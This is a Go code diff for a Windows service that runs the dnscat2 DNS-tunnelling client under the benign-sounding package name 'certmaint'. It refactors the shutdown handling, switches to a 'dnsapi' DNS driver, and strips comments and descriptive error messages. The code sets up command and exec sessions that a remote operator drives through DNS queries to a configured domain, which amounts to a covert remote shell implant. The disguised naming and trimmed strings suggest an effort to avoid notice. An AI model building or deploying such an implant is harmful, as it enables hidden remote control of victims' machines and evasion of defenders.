@@ -3,44 +3,33 @@
 package main
 
 import (
-	"context"
 	"fmt"
-	"math/rand"
 	"time"
 
 	"certmaint/pkg/controller"
 	"certmaint/pkg/driver/command"
 	"certmaint/pkg/session"
-	"certmaint/pkg/tunnel/dns"
+	"certmaint/pkg/tunnel/dnsapi"
 
 	"golang.org/x/sys/windows/svc"
 )
 
 type dnscat2Service struct {
 	config *Config
-	cancel context.CancelFunc
 }
 
 func (s *dnscat2Service) Execute(args []string, r <-chan svc.ChangeRequest, changes chan<- svc.Status) (bool, uint32) {
 	const cmdsAccepted = svc.AcceptStop | svc.AcceptShutdown
 
-	// Tell SCM we are starting
 	changes <- svc.Status{State: svc.StartPending}
 
-	// Create context for graceful shutdown
-	ctx, cancel := context.WithCancel(context.Background())
-	s.cancel = cancel
-
-	// Start dnscat2 in background
 	errChan := make(chan error, 1)
 	go func() {
 		errChan <- runDnscat(s.config)
 	}()
 
-	// Tell SCM we are running
 	changes <- svc.Status{State: svc.Running, Accepts: cmdsAccepted}
 
-	// Service control loop
 loop:
 	for {
 		select {
@@ -51,31 +40,21 @@ loop:
 
 			case svc.Stop, svc.Shutdown:
 				changes <- svc.Status{State: svc.StopPending}
-
-				// Trigger graceful shutdown
-				cancel()
-
-				// Wait for cleanup with timeout
+				// Destroy unblocks the running dnsapi driver; then wait for the
+				// goroutine to exit, with a hard timeout as fallback.
+				controller.Destroy()
 				select {
+				case <-errChan:
 				case <-time.After(10 * time.Second):
-					// Force cleanup if taking too long
-					controller.Destroy()
-				case <-ctx.Done():
-					// Clean shutdown completed
 				}
-
 				break loop
-
-			default:
-				logError(fmt.Sprintf("Unexpected control request #%d", c))
 			}
 
 		case err := <-errChan:
 			if err != nil {
-				logError(fmt.Sprintf("dnscat2 error: %v", err))
+				logError(err.Error())
 				return true, 1
 			}
-			// dnscat2 exited normally
 			break loop
 		}
 	}
@@ -85,9 +64,6 @@ loop:
 }
 
 func runDnscat(config *Config) error {
-	rand.Seed(time.Now().UnixNano())
-
-	// Configure session settings
 	session.PacketTrace = config.PacketTrace
 	session.PacketDelay = time.Duration(config.Delay) * time.Millisecond
 	session.DoEncryption = !config.NoEncryption
@@ -95,7 +71,6 @@ func runDnscat(config *Config) error {
 
 	controller.SetMaxRetransmits(config.MaxRetransmit)
 
-	// Determine DNS server: config → system registry DNS → 8.8.8.8
 	dnsServer := config.DnsServer
 	if dnsServer == "" {
 		dnsServer = getSystemDNS()
@@ -104,25 +79,21 @@ func runDnscat(config *Config) error {
 		dnsServer = "8.8.8.8"
 	}
 
-	// Create session
 	var sess *session.Session
 	var err error
 
 	if config.ExecCommand != "" {
 		sess, err = session.NewExecSession("exec", config.ExecCommand)
 	} else {
-		// Default to command session
 		sess, err = newCommandSession("command")
 	}
-
 	if err != nil {
-		return fmt.Errorf("failed to create session: %w", err)
+		return fmt.Errorf("session: %w", err)
 	}
 
 	controller.AddSession(sess)
 
-	// Create and run DNS driver
-	dnsDriver, err := dns.NewDriver(
+	dnsDriver, err := dnsapi.NewDriver(
 		config.Domain,
 		"0.0.0.0",
 		uint16(config.DnsPort),
@@ -130,15 +101,12 @@ func runDnscat(config *Config) error {
 		dnsServer,
 	)
 	if err != nil {
-		return fmt.Errorf("failed to create DNS driver: %w", err)
+		return fmt.Errorf("driver: %w", err)
 	}
-
 	defer dnsDriver.Close()
 	defer controller.Destroy()
 
-	// Run DNS driver (blocking)
 	dnsDriver.Run()
-
 	return nil
 }
 
@@ -150,11 +118,10 @@ func newCommandSession(name string) (*session.Session, error) {
 
 	cmdDriver := command.NewDriver()
 
-	// Set up callbacks
 	cmdDriver.CreateSession = func(name, cmd string) uint16 {
 		newSess, err := session.NewExecSession(name, cmd)
 		if err != nil {
-			logError(fmt.Sprintf("Failed to create exec session: %v", err))
+			logError(err.Error())
 			return 0
 		}
 		controller.AddSession(newSess)
